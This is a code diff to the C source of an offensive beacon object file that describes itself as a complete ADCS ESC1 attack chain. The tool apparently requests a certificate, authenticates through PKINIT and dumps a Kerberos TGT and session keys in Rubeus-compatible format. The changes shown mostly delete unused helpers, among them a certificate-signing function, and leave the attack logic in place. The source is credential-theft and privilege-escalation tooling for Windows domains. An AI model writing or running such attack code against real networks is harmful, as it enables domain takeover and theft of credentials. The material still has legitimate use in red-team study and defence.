@@ -1,4 +1,4 @@
-﻿/*
+/*
  * ESC1-unPAC BOF - Complete ADCS ESC1 Attack Chain
  * 
  * Complete attack chain in a single BOF:
@@ -200,8 +200,6 @@ static BYTE g_dhPublicKey[128];
 static BYTE g_sessionKey[32];
 static BYTE g_replyKey[32];
 static int g_nonce;
-static int g_sessionKeyLen;
-static int g_replyKeyLen;
 
 /*
  * =============================================================================
@@ -537,23 +535,6 @@ static BYTE* BuildSequence(BYTE* content, int contentLen, int* outLen) {
     result = (BYTE*)malloc(*outLen);
 
     result[0] = 0x30; /* SEQUENCE */
-    memcpy(result + 1, lenBuf, lenSize);
-    memcpy(result + 1 + lenSize, content, contentLen);
-
-    return result;
-}
-
-/* Build DER SET */
-static BYTE* BuildSet(BYTE* content, int contentLen, int* outLen) {
-    int lenSize;
-    BYTE lenBuf[4];
-    BYTE* result;
-
-    lenSize = EncodeLength(lenBuf, contentLen);
-    *outLen = 1 + lenSize + contentLen;
-    result = (BYTE*)malloc(*outLen);
-
-    result[0] = 0x31; /* SET */
     memcpy(result + 1, lenBuf, lenSize);
     memcpy(result + 1 + lenSize, content, contentLen);
 
@@ -985,23 +966,6 @@ static int bigint_cmp(BigInt* a, BigInt* b) {
     return 0;
 }
 
-/* Addition: result = a + b */
-static void bigint_add(BigInt* result, BigInt* a, BigInt* b) {
-    int i;
-    ULONGLONG carry = 0;
-    int maxLen = (a->len > b->len) ? a->len : b->len;
-
-    for (i = 0; i < maxLen || carry; i++) {
-        ULONGLONG sum = carry;
-        if (i < a->len) sum += a->words[i];
-        if (i < b->len) sum += b->words[i];
-        result->words[i] = (DWORD)sum;
-        carry = sum >> 32;
-    }
-    result->len = i;
-    while (result->len > 1 && result->words[result->len - 1] == 0) result->len--;
-}
-
 /* Subtraction: result = a - b (assumes a >= b) */
 static void bigint_sub(BigInt* result, BigInt* a, BigInt* b) {
     int i;
@@ -1041,16 +1005,6 @@ static void bigint_mul(BigInt* result, BigInt* a, BigInt* b) {
     while (temp.len > 1 && temp.words[temp.len - 1] == 0) temp.len--;
 
     memcpy(result, &temp, sizeof(BigInt));
-}
-
-/* Left shift by 1 word (32 bits) */
-static void bigint_shift_left_word(BigInt* n) {
-    int i;
-    for (i = n->len; i > 0; i--) {
-        n->words[i] = n->words[i - 1];
-    }
-    n->words[0] = 0;
-    n->len++;
 }
 
 /* Get bit at position */
@@ -1354,61 +1308,6 @@ static BYTE* BuildAuthPack(const char* user, const char* realm,
  * PKINIT - CMS SignedData Construction
  * =============================================================================
  */
-
-static BYTE* SignAuthPack(PCCERT_CONTEXT pCert, BYTE* authPack, int authPackLen, int* outLen) {
-    HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv = 0;
-    DWORD keySpec = 0;
-    BOOL fCallerFree = FALSE;
-    HCRYPTHASH hHash = 0;
-    BYTE* signature = NULL;
-    DWORD sigLen = 0;
-
-    /* Get private key from certificate */
-    if (!CryptAcquireCertificatePrivateKey(pCert, 0, NULL, &hProv, &keySpec, &fCallerFree)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to acquire certificate private key");
-        return NULL;
-    }
-
-    /* Create SHA-1 hash of authPack */
-    if (!CryptCreateHash((HCRYPTPROV)hProv, CALG_SHA1, 0, 0, &hHash)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create hash");
-        goto cleanup;
-    }
-
-    if (!CryptHashData(hHash, authPack, authPackLen, 0)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to hash data");
-        goto cleanup;
-    }
-
-    /* Get signature size */
-    if (!CryptSignHashW(hHash, keySpec, NULL, 0, NULL, &sigLen)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get signature size");
-        goto cleanup;
-    }
-
-    signature = (BYTE*)malloc(sigLen);
-    if (!CryptSignHashW(hHash, keySpec, NULL, 0, signature, &sigLen)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to sign hash");
-        free(signature);
-        signature = NULL;
-        goto cleanup;
-    }
-
-    /* Reverse signature (Windows outputs little-endian) */
-    for (DWORD i = 0; i < sigLen / 2; i++) {
-        BYTE tmp = signature[i];
-        signature[i] = signature[sigLen - 1 - i];
-        signature[sigLen - 1 - i] = tmp;
-    }
-
-    *outLen = sigLen;
-
-cleanup:
-    if (hHash) CryptDestroyHash(hHash);
-    if (fCallerFree && hProv) CryptReleaseContext((HCRYPTPROV)hProv, 0);
-
-    return signature;
-}
 
 static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content, int contentLen, int* outLen) {
     /*
@@ -3799,7 +3698,6 @@ static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
 
     /* Store reply key globally */
     memcpy(g_replyKey, replyKey, 32);
-    g_replyKeyLen = 32;
 
     /* Step 5: Extract and decrypt enc-part */
     int encPartLen;
@@ -3838,7 +3736,6 @@ static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
 
     /* Store session key globally */
     memcpy(g_sessionKey, sessionKey, sessionKeyLen);
-    g_sessionKeyLen = sessionKeyLen;
 
     /* Output TGT in kirbi format (Rubeus compatible) */
     {
@@ -4891,4 +4788,3 @@ int main(int argc, char* argv[]) {
     return 0;
 }
 #endif
-
